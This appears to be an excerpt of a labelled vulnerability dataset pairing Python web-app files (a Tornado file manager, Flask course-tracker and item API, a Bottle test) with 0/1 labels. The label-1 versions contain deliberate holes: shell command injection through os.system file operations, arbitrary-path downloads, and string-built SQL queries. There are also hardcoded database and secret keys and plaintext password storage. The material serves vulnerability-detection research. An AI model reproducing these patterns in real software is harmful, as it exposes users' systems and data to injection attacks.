                    pass
            cwd_uuid = encode_str_to_hexed_b64(files_hierarchy_cwd)

            # File actually exists, sending data
            working_user = users.get_user_by_cookie(
                self.get_cookie('user_active_login', default=''))
            file_temp = preproc.preprocess_webpage(file_temp, working_user,
                files_attrib_list=files_attrib_list,
                files_hierarchy_list=files_hierarchy_list,
                cwd_uuid=cwd_uuid)
            future.set_result(file_temp)
        tornado.ioloop.IOLoop.instance().add_callback(get_final_html_async,
            target_path)
        file_temp = yield future

        self.set_status(200, ""OK"")
        self.add_header('Cache-Control', 'max-age=0')
        self.add_header('Connection', 'close')
        self.add_header('Content-Type', 'text/html')
        self.add_header('Content-Length', str(len(file_temp)))
        self.write(file_temp)
        self.flush()
        self.finish()
        return self

    head=get
    pass

################################################################################

class FilesDownloadHandler(tornado.web.RequestHandler):
    SUPPORTED_METHODS = ['GET', 'HEAD']

    @tornado.web.asynchronous
    @tornado.gen.coroutine
    def get(self, file_path, file_name):
        # Something that I do not wish to write too many times..
        def invoke_404():
            self.set_status(404, ""Not Found"")
            self._headers = tornado.httputil.HTTPHeaders()
            self.add_header('Content-Length', '0')
            self.flush()
            return

        # Get file location (exactly...)
        try:
            file_path = decode_hexed_b64_to_str(file_path)
        except Exception:
            file_path = ''
        if not file_path:
            invoke_404()
            return

        # File actually exists, sending data
        try:
            file_handle = open(file_path, 'rb')
        except Exception:
            invoke_404()
            return
        file_data = file_handle.read()
        file_handle.close()
        file_stream = io.BytesIO(file_data)

        self.set_status(200, ""OK"")
        self.add_header('Cache-Control', 'max-age=0')
        self.add_header('Connection', 'close')
        self.add_header('Content-Type', 'application/x-download')
        self.add_header('Content-Length', str(len(file_data)))

        # Asynchronous web request...
        file_block_size = 64 * 1024 # 64 KiB / Chunk
        file_block = bytes()

        while file_stream.tell() < len(file_data):
            byte_pos = file_stream.tell()
            # Entry to the concurrency worker
            future = tornado.concurrent.Future()
            # Concurrent worker
            def retrieve_data_async():
                block = file_stream.read(file_block_size)
                future.set_result(block)
            # Injection and pending
            tornado.ioloop.IOLoop.instance().add_callback(retrieve_data_async)
            # Reset or read
            file_block = yield future
            self.write(file_block)
            file_block = None
            self.flush()
        file_block = None
        self.finish()

        # Release memory...
        file_stream = None
        file_data = None
        return self

    head=get
    pass

################################################################################

class FilesOperationHandler(tornado.web.RequestHandler):
    SUPPORTED_METHODS = ['POST']

    @tornado.web.asynchronous
    @tornado.gen.coroutine
    def post(self):
        # Another concurrency blob...
        future = tornado.concurrent.Future()

        def get_final_html_async():
            operation_content_raw = self.request.body
            operation_content = json.loads(operation_content_raw.decode('utf-8', 'ignore'))
            action = operation_content['action']
            sources = operation_content['source']
            if type(sources) == list:
                for i in range(0, len(sources)):
                    try:
                        sources[i] = decode_hexed_b64_to_str(sources[i])
                    except:
                        pass
            else:
                sources = decode_hexed_b64_to_str(sources)
            if action in ['copy', 'move']:
                try:
                    target = decode_hexed_b64_to_str(operation_content['target'])
                except:
                    target = '/'
            elif action in ['rename', 'new-folder']:
                try:
                    target = operation_content['target']
                except:
                    target = sources # I am not handling more exceptions as this is brutal enough
            # Done assigning values, now attempting to perform operation
            if action == 'copy':
                for source in sources:
                    os.system('cp ""D:%s"" ""D:%s""' % (source, target))
            elif action == 'move':
                for source in sources:
                    os.system('mv ""D:%s"" ""D:%s""' % (source, target))
            elif action == 'delete':
                for source in sources:
                    os.system('rm ""D:%s""' % source)
            elif action == 'rename':
                os.system('rename ""D:%s"" ""%s""' % (sources, target))
            elif action == 'new-folder':
                os.system('mkdir ""D:%s%s""' % (sources, target))
            future.set_result('')
        tornado.ioloop.IOLoop.instance().add_callback(get_final_html_async)
        file_temp = yield future

        self.set_status(200, ""OK"")
        self.add_header('Cache-Control', 'max-age=0')
        self.add_header('Connection', 'close')
        self.add_header('Content-Type', 'text/html')
        self.add_header('Content-Length', str(len(file_temp)))
        self.write(file_temp)
        self.flush()
        self.finish()
        return self
    pass

################################################################################

class FilesUploadHandler(tornado.web.RequestHandler):
    SUPPORTED_METHODS = ['POST']

    @tornado.web.asynchronous
    @tornado.gen.coroutine
    def post(self, target_path, file_name):
        # Another concurrency blob...
        future = tornado.concurrent.Future()

        def save_file_async(alter_ego, target_path, file_name):
            upload_data = alter_ego.request.body
            target_path = decode_hexed_b64_to_str(target_path)
            # Attempting to write to file... otherwise might try to rename until
            # File does not exist.
            def get_non_duplicate_path(file_path):
                if not os.path.exists('D:' + file_path):
                    return file_path
                duplicate = 1
                while duplicate < 101:
                    new_path = re.sub(r'\.(.*?)$', ' (%d).\\1' % duplicate, file_path)
                    if not os.path.exists('D:' + new_path):
                        return new_path
                    duplicate = duplicate + 1
                return ''
            file_path = get_non_duplicate_path(target_path + file_name)
            if not file_path:
                future.set_result('bzs_upload_failure')
                return
            # Committing changes to database
            file_stream = open(file_path, 'wb')
            file_stream.write(upload_data)
            file_stream.close()
            # Final return
            future.set_result('bzs_upload_success')
        tornado.ioloop.IOLoop.instance().add_callback(save_file_async,
            self, target_path, file_name)

        response_temp = yield future
        self.set_status(200, ""OK"")
        self.add_header('Cache-Control', 'max-age=0')
        self.add_header('Connection', 'close')
        self.add_header('Content-Type', 'text/html')
        self.add_header('Content-Length', str(len(response_temp)))
        self.write(response_temp)
        self.flush()
        self.finish()
        return self
    pass
/n/n/n",1
134,134,20ef2d4010f9497b8221524edd0c706e2c6a4147,"src/tech_track.py/n/nfrom flask import Flask
from flask import session, redirect, url_for, escape, request
from flask import request
from flaskext.mysql import MySQL
from flask import render_template
from flask import Flask,jsonify,json
from string import Template

app = Flask(__name__)

#Required code to connect to mySQL database.
mysql = MySQL()
app = Flask(__name__)
app.config['MYSQL_DATABASE_USER'] = 'root'
app.config['MYSQL_DATABASE_PASSWORD'] = '27'

app.config['MYSQL_DATABASE_DB'] = 'TechTrack'
app.config['MYSQL_DATABASE_HOST'] = 'localhost'
mysql.init_app(app)

#Homepage
#TODO: Replace wtih HTML template when created. 
@app.route('/')
def index():
	if 'username' in session:
		return redirect(url_for('instructions'))
	return redirect(url_for('login'))
	

@app.route('/instructions')
def instructions():
	if 'username' in session:
		return render_template('instructions.html')
	return redirect(url_for('login'))

#Login Page
#Default route only answers to GET requests.
#Can change this by providing methods argument to the route() decorator.
@app.route('/login', methods=['GET', 'POST'])
def login():

	error=None

	#The request was a POST request, i.e. user is submitting form data.
	if request.method == 'POST':

		#Get information from form.
		username = request.form['username']
		password = request.form['password']

		#Check database.
		cursor = mysql.connect().cursor()
		cursor.execute(""SELECT * from Users where emailAccount=%s and password=%s"", (username, password))
		data = cursor.fetchone()

		if data is None:
			error=""Username or password is incorrect.""
		else:
			#Session.
			session['username'] = request.form['username']
			session['lastCourseEntered'] = None
			return redirect(url_for('instructions'))

	return render_template('login.html', error=error)


#Register. 
@app.route('/register', methods=['GET', 'POST'])
def register():
    error = None
    if request.method == 'POST':
        emailAccount = request.form['username']
        password = request.form['password']

        splitDomainName = emailAccount.split('@')[1]
        if (splitDomainName != 'purdue.edu'):
        	error = ""You should use a Purdue email.""
    		return render_template('createAccount.html', error=error) 
        

        conn = mysql.connect()
        cursor = conn.cursor()
    
        cursor.execute(""SELECT * from Users where emailAccount=%s"", (emailAccount))
        data = cursor.fetchone()
        if data is None:
            #this password is unique so add it to the database
            cursor.execute('''INSERT INTO Users (emailAccount, password, isNewUser, cs180Completed, cs240Completed, cs250Completed, cs251Completed, cs314Completed, cs334Completed, cs381Completed, cs307Completed, cs448Completed, cs456Completed, cs422Completed, cs426Completed) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)''',(emailAccount, password, True, False, False, False, False, False, False, False, False, False, False, False, False))
            conn.commit()

            session['username'] = request.form['username']
            session['lastCourseEntered'] = None

            return redirect(url_for('instructions'))
        else: 
            error = ""Username is already in use.""

    #return ""You are already registered"" #render html for register page and send error message
    return render_template('createAccount.html', error=error) 

#levelPage1
@app.route('/levelPage1')
def levelPage1():
	if 'username' in session:

		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute(""SELECT * from Users where emailAccount=%s"", (session['username']))
		data = cursor.fetchone()

		status180 = data[3]
		status240 = data[4]
		status250=data[5]
		status251=data[6]

		if status180 is 1:
			status180 = 0;
		else:
			status180 = 1;

		if status240 is 1:
			status240 = 0;
		else:
			status240 = 1;

		if status250 is 1:
			status250 = 0;
		else:
			status250 = 1;
		
		if status251 is 1:
			status251 = 0;
		else:
			status251 = 1;

		try:
			#create a instance for filling up levelData
			levelDict = {
			'level' : 1,
			'classes': [
					{
						'name': 'CS 180', 
						'status': status180
					}, 
					{
						'name':'CS 240', 
						'status':status240
					}, 
					{
						'name':'CS 250',
						'status':status250
					}, 
					{
						'name':'CS 251', 
						'status':status251
					} 
				]
			}
		except Exception ,e:
			print str(e)
		return jsonify(levelDict) 


		#return render_template('levelPage1.html')
	return redirect(url_for('login'))

@app.route('/levelPage2')
def levelPage2():
	if 'username' in session:
		
		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute(""SELECT * from Users where emailAccount=%s"", (session['username']))
		data = cursor.fetchone()
		#print(data);

		status180 = data[3]
		status240 = data[4]
		status250=data[5]
		status251=data[6]
		status314 = data[7]
		status334 = data[8]
		status381=data[9]
		status307=data[10]


		#From database: 0 is not completed, 1 is completed
		#For the JSON: 0 is completed, 1 is not completed and in current level, 2 is prerequisites arent met
		#If any of level 1's courses are not completed, then user should not be able to do any of level 2 courses
		if ((status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0)):
			status314 = 2;
			status334 = 2;
			status381 = 2;
			status307 = 2;
		else: 
			if status314 is 1:
				status314 = 0;
			else:
				status314 = 1;

			if status334 is 1:
				status334 = 0;
			else:
				status334 = 1;

			if status381 is 1:
				status381 = 0;
			else:
				status381 = 1;
			
			if status307 is 1:
				status307 = 0;
			else:
				status307 = 1;


		try:
			#create a instance for filling up levelData
			levelDict = {
			'level' : 2,
			'classes': [
					{
						'name':'CS 307', 
						'status':status307
					},
					{
						'name': 'CS 314', 
						'status': status314
					}, 
					{
						'name':'CS 334', 
						'status':status334
					}, 
					{
						'name':'CS 381',
						'status':status381
					} 
					
				]
			}
		except Exception ,e:
			print str(e)
		return jsonify(levelDict)

		#return render_template('levelPage2.html')
	return redirect(url_for('login'))

@app.route('/levelPage3')
def levelPage3():
	if 'username' in session:
		
		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute(""SELECT * from Users where emailAccount=%s"", (session['username']))
		data = cursor.fetchone()

		status180 = data[3]
		status240 = data[4]
		status250=data[5]
		status251=data[6]
		status314 = data[7]
		status334 = data[8]
		status381=data[9]
		status307=data[10]
		status448 = data[11]
		status456 = data[12]
		status426 = data[14]
		status422 = data[13]

		if (status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0) or (status314 is 0) or (status334 is 0) or (status381 is 0) or (status307 is 0):
			status448 = 2
			status456 = 2
			status426 = 2
			status422 = 2
		else: 		
			if status448 is 1:
				status448 = 0
			else:
				status448 = 1

			if status456 is 1:
				status456 = 0
			else:
				status456 = 1

			if status426 is 1:
				status426 = 0
			else:
				status426 = 1

			if status422 is 1:
				status422 = 0
			else:
				status422 = 1

		try:
			# Create an instance for filling up classData
			levelDict = {
			'level': 3,
			'classes': [
				{
					'name':""CS 422"", 
					'status':status422
				},
				{
					'name':""CS 426"",
					'status':status426
				},
				{
					'name': ""CS 448"", 
					'status':status448
				}, 
				{
					'name':""CS 456"", 
					'status':status456
				}, 
				
				
			]}
			
		except Exception ,e:
			print str(e)

		return jsonify(levelDict)

	return redirect(url_for('login'))


@app.route('/overview/<classNum>')
def overview(classNum):
	if 'username' in session:
		classNoSpace = classNum.split(' ')[0]+classNum.split(' ')[1]

		#Save the current course as a session variable.
		session['currentCourse'] = classNoSpace

		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute(""SELECT courseName,courseOverview from courses where courseAbbreviation=%s"", (classNoSpace))
		data = cursor.fetchone()

		return render_template('overview.html', className = classNum, courseTitle = data[0], courseOverview = data[1])

	return redirect(url_for('index'))


#Logout

@app.route('/lastCourseEntered')
def lastCourseEntered():
	if 'username' in session:
		if 'lastCourseEntered' in session:
			return jsonify(session['lastCourseEntered'])
		else:
			return jsonify(""None"")
	return redirect(url_for('login'))

@app.route('/logout')
def logout(): 
	session.pop('username', None)
	return redirect(url_for('index'))


@app.route('/levels')
def levels(): 
	if 'username' in session:
		return render_template('hallway.html')
	return redirect(url_for('login'))


@app.route('/quiz', methods=['GET', 'POST'])
def quiz():

	error = None
	answers = None
	grades = None
	showSubmit = None
	course = None
	rank = None

	if 'username' in session:

		if 'currentCourse' in session:
			course = session['currentCourse']
		else:
			return redirect(url_for('levels'))

		conn = mysql.connect()
		cursor = conn.cursor()
		cursor.execute(""SELECT questionString, option1, option2, option3, option4, correctAnswer, courseName FROM courses join questions on questions.courseId=courses.courseId where courses.courseAbbreviation=%s"", (course))

		questions = []
		for row in cursor:
			questions.append(row)

		if request.method == 'POST':
			#print request.form

			if (len(request.form) != 7):
				error = ""Please answer all of the questions.""
				showSubmit = True
			else:
				grades = []
				answers = []
				score = 0

				for i in range(0, len(request.form) - 2):
					answers.append(int(request.form[""q"" + str(i+1)]))

					if ( int(questions[i][5]) == answers[i] ):
						grades.append(1)
						score = score + 1
					else:
						grades.append(0)

				rank = request.form[""rankquiz""]

				total = score + 3*int(rank)

				cursor.execute(""SELECT courseId FROM courses WHERE courseAbbreviation=%s"", (course))
				courseId = cursor.fetchone()

				cursor.execute(""SELECT courseConcentration FROM courses WHERE courseAbbreviation=%s"", (course))
				courseConcentration = cursor.fetchone()

				cursor.execute(""DELETE FROM results WHERE emailAccount=%s and courseId=%s"", (session['username'], str(courseId[0])))

				#print ""INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES ('"" + session['username'] + ""',"" + str(courseId[0]) + "",'"" + str(courseConcentration[0]) + ""',"" + str(score) + "","" + str(rank) + "","" + str(total) + "")""
				cursor.execute(""INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES (%s, %s, %s, %s, %s, %s)"", (session['username'], str(courseId[0]), str(courseConcentration[0]), str(score), str(rank), str(total)))
				cursor.execute(""UPDATE users SET ""+course.lower()+""Completed=1 WHERE emailAccount=%s"", (session['username']))
				conn.commit()

				session['lastCourseEntered'] = session['currentCourse']
				session.pop('currentCourse', None)
				
				rank = int(rank)
			return render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)
		else:
			showSubmit = True
			return render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)
	return redirect(url_for('login'))

@app.route('/summary', methods=['GET'])
def summary():
	if 'username' in session:

		conn = mysql.connect()
		cursor = conn.cursor()

		#select the maximum score from the results table
		cursor.execute(""SELECT courseConcentration FROM results WHERE total = (SELECT MAX(total) FROM (SELECT * FROM results WHERE courseId > 4) Temp) and courseId > 4 and emailAccount=%s"", (session['username']));
		courseConcentration = cursor.fetchone()

		return render_template('summary.html', courseConcentration = courseConcentration[0])
	return redirect(url_for('login'))

#Secret Key
app.secret_key = 'A0Zr98j/3yX R~'
/n/n/n",0
135,135,20ef2d4010f9497b8221524edd0c706e2c6a4147,"/src/tech_track.py/n/nfrom flask import Flask
from flask import session, redirect, url_for, escape, request
from flask import request
from flaskext.mysql import MySQL
from flask import render_template
from flask import Flask,jsonify,json
from string import Template

app = Flask(__name__)

#Required code to connect to mySQL database.
mysql = MySQL()
app = Flask(__name__)
app.config['MYSQL_DATABASE_USER'] = 'root'
app.config['MYSQL_DATABASE_PASSWORD'] = '27'

app.config['MYSQL_DATABASE_DB'] = 'TechTrack'
app.config['MYSQL_DATABASE_HOST'] = 'localhost'
mysql.init_app(app)

#Homepage
#TODO: Replace wtih HTML template when created. 
@app.route('/')
def index():
	if 'username' in session:
		return redirect(url_for('instructions'))
	return redirect(url_for('login'))
	

@app.route('/instructions')
def instructions():
	if 'username' in session:
		return render_template('instructions.html')
	return redirect(url_for('login'))

#Login Page
#Default route only answers to GET requests.
#Can change this by providing methods argument to the route() decorator.
@app.route('/login', methods=['GET', 'POST'])
def login():

	error=None

	#The request was a POST request, i.e. user is submitting form data.
	if request.method == 'POST':

		#Get information from form.
		username = request.form['username']
		password = request.form['password']

		#Check database.
		cursor = mysql.connect().cursor()
		cursor.execute(""SELECT * from Users where emailAccount='"" + username + ""' and password='"" + password + ""'"")
		data = cursor.fetchone()

		if data is None:
			error=""Username or password is incorrect.""
		else:
			#Session.
			session['username'] = request.form['username']
			return redirect(url_for('instructions'))

	return render_template('login.html', error=error)


#Register. 
@app.route('/register', methods=['GET', 'POST'])
def register():
    error = None
    if request.method == 'POST':
        emailAccount = request.form['username']
        password = request.form['password']

        splitDomainName = emailAccount.split('@')[1]
        if (splitDomainName != 'purdue.edu'):
        	error = ""You should use a Purdue email.""
    		return render_template('createAccount.html', error=error) 
        

        conn = mysql.connect()
        cursor = conn.cursor()
    
        cursor.execute(""SELECT * from Users where emailAccount='"" + emailAccount + ""'"")
        data = cursor.fetchone()
        if data is None:
            #this password is unique so add it to the database
            cursor.execute('''INSERT INTO Users (emailAccount, password, isNewUser, cs180Completed, cs240Completed, cs250Completed, cs251Completed, cs314Completed, cs334Completed, cs381Completed, cs307Completed, cs448Completed, cs456Completed, cs422Completed, cs426Completed) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)''',(emailAccount, password, True, False, False, False, False, False, False, False, False, False, False, False, False))
            conn.commit()

            session['username'] = request.form['username']

            return redirect(url_for('instructions'))
        else: 
            error = ""Username is already in use.""

    #return ""You are already registered"" #render html for register page and send error message
    return render_template('createAccount.html', error=error) 

#levelPage1
@app.route('/levelPage1')
def levelPage1():
	if 'username' in session:

		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute(""SELECT * from Users where emailAccount='"" + session['username'] + ""'"")
		data = cursor.fetchone()

		status180 = data[3]
		status240 = data[4]
		status250=data[5]
		status251=data[6]

		if status180 is 1:
			status180 = 0;
		else:
			status180 = 1;

		if status240 is 1:
			status240 = 0;
		else:
			status240 = 1;

		if status250 is 1:
			status250 = 0;
		else:
			status250 = 1;
		
		if status251 is 1:
			status251 = 0;
		else:
			status251 = 1;

		try:
			#create a instance for filling up levelData
			levelDict = {
			'level' : 1,
			'classes': [
					{
						'name': 'CS 180', 
						'status': status180
					}, 
					{
						'name':'CS 240', 
						'status':status240
					}, 
					{
						'name':'CS 250',
						'status':status250
					}, 
					{
						'name':'CS 251', 
						'status':status251
					} 
				]
			}
		except Exception ,e:
			print str(e)
		return jsonify(levelDict) 


		#return render_template('levelPage1.html')
	return redirect(url_for('login'))

@app.route('/levelPage2')
def levelPage2():
	if 'username' in session:
		
		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute(""SELECT * from Users where emailAccount='"" + session['username'] + ""'"")
		data = cursor.fetchone()
		#print(data);

		status180 = data[3]
		status240 = data[4]
		status250=data[5]
		status251=data[6]
		status314 = data[7]
		status334 = data[8]
		status381=data[9]
		status307=data[10]


		#From database: 0 is not completed, 1 is completed
		#For the JSON: 0 is completed, 1 is not completed and in current level, 2 is prerequisites arent met
		#If any of level 1's courses are not completed, then user should not be able to do any of level 2 courses
		if ((status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0)):
			status314 = 2;
			status334 = 2;
			status381 = 2;
			status307 = 2;
		else: 
			if status314 is 1:
				status314 = 0;
			else:
				status314 = 1;

			if status334 is 1:
				status334 = 0;
			else:
				status334 = 1;

			if status381 is 1:
				status381 = 0;
			else:
				status381 = 1;
			
			if status307 is 1:
				status307 = 0;
			else:
				status307 = 1;


		try:
			#create a instance for filling up levelData
			levelDict = {
			'level' : 2,
			'classes': [
					{
						'name':'CS 307', 
						'status':status307
					},
					{
						'name': 'CS 314', 
						'status': status314
					}, 
					{
						'name':'CS 334', 
						'status':status334
					}, 
					{
						'name':'CS 381',
						'status':status381
					} 
					
				]
			}
		except Exception ,e:
			print str(e)
		return jsonify(levelDict)

		#return render_template('levelPage2.html')
	return redirect(url_for('login'))

@app.route('/levelPage3')
def levelPage3():
	if 'username' in session:
		
		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute(""SELECT * from Users where emailAccount='"" + session['username'] + ""'"")
		data = cursor.fetchone()

		status180 = data[3]
		status240 = data[4]
		status250=data[5]
		status251=data[6]
		status314 = data[7]
		status334 = data[8]
		status381=data[9]
		status307=data[10]
		status448 = data[11]
		status456 = data[12]
		status426 = data[14]
		status422 = data[13]

		if (status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0) or (status314 is 0) or (status334 is 0) or (status381 is 0) or (status307 is 0):
			status448 = 2
			status456 = 2
			status426 = 2
			status422 = 2
		else: 		
			if status448 is 1:
				status448 = 0
			else:
				status448 = 1

			if status456 is 1:
				status456 = 0
			else:
				status456 = 1

			if status426 is 1:
				status426 = 0
			else:
				status426 = 1

			if status422 is 1:
				status422 = 0
			else:
				status422 = 1

		try:
			# Create an instance for filling up classData
			levelDict = {
			'level': 3,
			'classes': [
				{
					'name':""CS 422"", 
					'status':status422
				},
				{
					'name':""CS 426"",
					'status':status426
				},
				{
					'name': ""CS 448"", 
					'status':status448
				}, 
				{
					'name':""CS 456"", 
					'status':status456
				}, 
				
				
			]}
			
		except Exception ,e:
			print str(e)

		return jsonify(levelDict)

	return redirect(url_for('login'))


@app.route('/overview/<classNum>')
def overview(classNum):
	if 'username' in session:
		classNoSpace = classNum.split(' ')[0]+classNum.split(' ')[1]

		#Save the current course as a session variable.
		session['currentCourse'] = classNoSpace

		conn = mysql.connect()
		cursor = conn.cursor()

		cursor.execute(""SELECT courseName,courseOverview from courses where courseAbbreviation='"" + classNoSpace + ""'"")
		data = cursor.fetchone()

		return render_template('overview.html', className = classNum, courseTitle = data[0], courseOverview = data[1])

	return redirect(url_for('index'))


#Logout

@app.route('/lastCourseEntered')
def lastCourseEntered():
	if 'username' in session:
		if 'lastCourseEntered' in session:
			return jsonify(session['lastCourseEntered'])
		else:
			return jsonify(""None"")
	return redirect(url_for('login'))

@app.route('/logout')
def logout(): 
	session.pop('username', None)
	return redirect(url_for('index'))


@app.route('/levels')
def levels(): 
	if 'username' in session:
		return render_template('hallway.html')
	return redirect(url_for('login'))


@app.route('/quiz', methods=['GET', 'POST'])
def quiz():

	error = None
	answers = None
	grades = None
	showSubmit = None
	course = None
	rank = None

	if 'username' in session:

		if 'currentCourse' in session:
			course = session['currentCourse']
		else:
			return redirect(url_for('levels'))

		conn = mysql.connect()
		cursor = conn.cursor()
		cursor.execute(""SELECT questionString, option1, option2, option3, option4, correctAnswer, courseName FROM courses join questions on questions.courseId=courses.courseId where courses.courseAbbreviation='"" + course + ""'"")

		questions = []
		for row in cursor:
			questions.append(row)

		if request.method == 'POST':
			#print request.form

			if (len(request.form) != 7):
				error = ""Please answer all of the questions.""
				showSubmit = True
			else:
				grades = []
				answers = []
				score = 0

				for i in range(0, len(request.form) - 2):
					answers.append(int(request.form[""q"" + str(i+1)]))

					if ( int(questions[i][5]) == answers[i] ):
						grades.append(1)
						score = score + 1
					else:
						grades.append(0)

				rank = request.form[""rankquiz""]

				total = score + 3*int(rank)

				cursor.execute(""SELECT courseId FROM courses WHERE courseAbbreviation='"" + course +""'"")
				courseId = cursor.fetchone()

				cursor.execute(""SELECT courseConcentration FROM courses WHERE courseAbbreviation='"" + course +""'"")
				courseConcentration = cursor.fetchone()

				cursor.execute(""DELETE FROM results WHERE emailAccount='"" + session['username'] + ""' and courseId="" + str(courseId[0]))

				#print ""INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES ('"" + session['username'] + ""',"" + str(courseId[0]) + "",'"" + str(courseConcentration[0]) + ""',"" + str(score) + "","" + str(rank) + "","" + str(total) + "")""
				cursor.execute(""INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES ('"" + session['username'] + ""',"" + str(courseId[0]) + "",'"" + str(courseConcentration[0]) + ""',"" + str(score) + "","" + str(rank) + "","" + str(total) + "")"")
				cursor.execute(""UPDATE users SET "" + course.lower() + ""Completed=1 WHERE emailAccount='"" + session['username'] + ""'"")
				conn.commit()

				session['lastCourseEntered'] = session['currentCourse']
				session.pop('currentCourse', None)
				
				rank = int(rank)
			return render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)
		else:
			showSubmit = True
			return render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)
	return redirect(url_for('login'))

@app.route('/summary', methods=['GET'])
def summary():
	if 'username' in session:

		conn = mysql.connect()
		cursor = conn.cursor()

		#select the maximum score from the results table
		cursor.execute(""SELECT courseConcentration FROM results WHERE total = (SELECT MAX(total) FROM (SELECT * FROM results WHERE courseId > 4) Temp) and courseId > 4 and emailAccount='"" + session['username'] + ""'"");
		courseConcentration = cursor.fetchone()

		return render_template('summary.html', courseConcentration = courseConcentration[0])
	return redirect(url_for('login'))

#Secret Key
app.secret_key = 'A0Zr98j/3yX R~'
/n/n/n",1
126,126,3d3b5defd26ef7d205915bf643b6b1df90a15e44,"timf/api/views.py/n/nfrom flask import jsonify, request
from . import api

from run import mysql


@api.route('/items', methods=['GET'])
def list_items():
    sql = '''SELECT id, name_enus from tblDBCItem where auctionable = true;'''
    cursor = mysql.connection.cursor()
    cursor.execute(sql)
    data = cursor.fetchall()

    results = []
    for row in data:
        item = {}
        for tup in zip([column[0] for column in cursor.description], row):
            item[tup[0]] = tup[1]

        results.append(item)

    return jsonify({""items"": results})


@api.route('/items/<int:item_id>', methods=['GET'])
def get_item(item_id):
    sql = '''SELECT id, name_enus FROM tblDBCItem WHERE id = %s AND auctionable = true;'''
    cursor = mysql.connection.cursor()
    cursor.execute(sql, [item_id])
    data = cursor.fetchone()

    if data:
        item = {}
        for tup in zip([column[0] for column in cursor.description], data):
            item[tup[0]] = tup[1]
    else:
        return jsonify({""error"": ""item not found""}), 404

    return jsonify(item)


@api.route('/item/', methods=['GET'])
def resolve_item_name():
    data = []
    query = request.args.get('name')

    if query:
        sql = '''SELECT id, name_enus FROM `tblDBCItem` WHERE name_enus LIKE %s;'''
        cursor = mysql.connection.cursor()
        cursor.execute(sql, [""%"" + query + ""%"",])
        data = cursor.fetchall()
    else:
        return jsonify({""error"": ""No item ID or query provided""}), 404

    if data:
        results = []
        for row in data:
            item = {}
            for tup in zip([column[0] for column in cursor.description], row):
                item[tup[0]] = tup[1]

            results.append(item)
    else:
        return jsonify({""error"": ""item not found""}), 404

    return jsonify({""items"": results})
/n/n/n",0
127,127,3d3b5defd26ef7d205915bf643b6b1df90a15e44,"/timf/api/views.py/n/nfrom flask import jsonify, request
from . import api

from run import mysql


@api.route('/items', methods=['GET'])
def list_items():
    sql = '''SELECT id, name_enus from tblDBCItem where auctionable = true;'''
    cursor = mysql.connection.cursor()
    cursor.execute(sql)
    data = cursor.fetchall()

    results = []
    for row in data:
        item = {}
        for tup in zip([column[0] for column in cursor.description], row):
            item[tup[0]] = tup[1]

        results.append(item)

    return jsonify({""items"": results})


@api.route('/items/<int:item_id>', methods=['GET'])
def get_item(item_id):
    sql = '''SELECT id, name_enus FROM tblDBCItem WHERE id = {} AND auctionable = true;'''.format(item_id)
    cursor = mysql.connection.cursor()
    cursor.execute(sql)
    data = cursor.fetchone()

    if data:
        item = {}
        for tup in zip([column[0] for column in cursor.description], data):
            item[tup[0]] = tup[1]
    else:
        return jsonify({""error"": ""item not found""}), 404

    return jsonify(item)


@api.route('/item/', methods=['GET'])
def resolve_item_name():
    item_name = request.args.get('name')
    sql = '''SELECT id, name_enus FROM `tblDBCItem` WHERE name_enus LIKE ""%{}%"" '''.format(item_name)
    cursor = mysql.connection.cursor()
    cursor.execute(sql)
    data = cursor.fetchall()

    if data:
        results = []
        for row in data:
            item = {}
            for tup in zip([column[0] for column in cursor.description], row):
                item[tup[0]] = tup[1]

            results.append(item)
    else:
        return jsonify({""error"": ""item not found""}), 404

    return jsonify({""items"": results})
/n/n/n",1
76,76,666e52c5f0b8c1f4296e84471637033d9542a7a6,"main_test.py/n/nimport pytest
import bottle
import webtest
import MySQLdb
import os

from logging import getLogger
from bottle_mysql import Plugin

from video import video_api
from playlist import playlist_api

from database import populate_test_database

logger = getLogger()

app = bottle.default_app()
plugin = Plugin(dbuser=os.environ[""USER""], dbpass=os.environ[""PASSWORD""], dbname='test')
app.install(plugin)
test_app = webtest.TestApp(app)


def create_video(playlist_id, title, thumbnail, position):
    db = connect_to_database()
    cursor = db.cursor()
    cursor.execute(
        ""INSERT INTO video (playlist_id, title, thumbnail, position) VALUES(%s, %s, %s, %s);"", (playlist_id, title, thumbnail, position,))
    db.commit()
    db.close()


def create_playlist(name):
    db = connect_to_database()
    cursor = db.cursor()
    cursor.execute(
        ""INSERT INTO playlist (name, video_position) VALUES(%s, 0);"", (name,))
    db.commit()
    db.close()


def connect_to_database():
    db = MySQLdb.connect(""localhost"", ""root"", os.environ[""PASSWORD""], 'test')
    return db


def test_should_return_all_playlists():
    populate_test_database()

    create_playlist('first playlist')
    create_playlist('second playlist')

    response = test_app.get('/playlists')
    assert response.json['status'] == 'OK'
    assert response.json['data'] == [dict(id=1, name='first playlist'),
                                     dict(id=2, name='second playlist')]


def test_should_return_a_playlist():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.get('/playlists/1')
    assert response.json['status'] == 'OK'
    assert response.json['data'] == dict(
        id=1, name='first playlist', video_position=0)


def test_should_create_a_playlist():
    populate_test_database()

    response = test_app.post('/playlists/nn')
    assert response.json['status'] == 'OK'

    response2 = test_app.get('/playlists')
    assert response2.json['status'] == 'OK'
